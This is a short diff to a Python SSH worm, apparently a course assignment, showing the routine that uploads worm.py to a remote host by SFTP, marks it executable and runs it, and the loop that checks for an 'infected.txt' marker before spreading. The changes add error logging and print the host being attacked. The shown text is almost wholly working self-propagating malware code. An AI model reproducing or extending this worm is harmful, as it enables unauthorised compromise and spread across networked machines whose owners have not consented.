@@ -56,7 +56,7 @@ def spreadAndExecute(sshClient):
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("worm.py", "/tmp/worm.py")
 	sshClient.exec_command("chmod a+x /tmp/worm.py")
-	sshClient.exec_command("python /tmp/worm.py")
+	sshClient.exec_command("python /tmp/worm.py 2> errors.txt")
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -257,11 +257,13 @@ for host in networkHosts:
 		
 		try:
 			remotepath = '/tmp/infected.txt'
-			localpath = '/home/cpsc/'
+			localpath = os.getenv("HOME") + '/infected.txt'
 			sftp = sshInfo[0].open_sftp()
 			sftp.get(remotepath, localpath)
 
-		except IOError:
+		except IOError, e:
+			print e
+			print "Attacking: ", host
 			print "This system should be infected"
 			spreadAndExecute(sshInfo[0])
 			sys.exit()
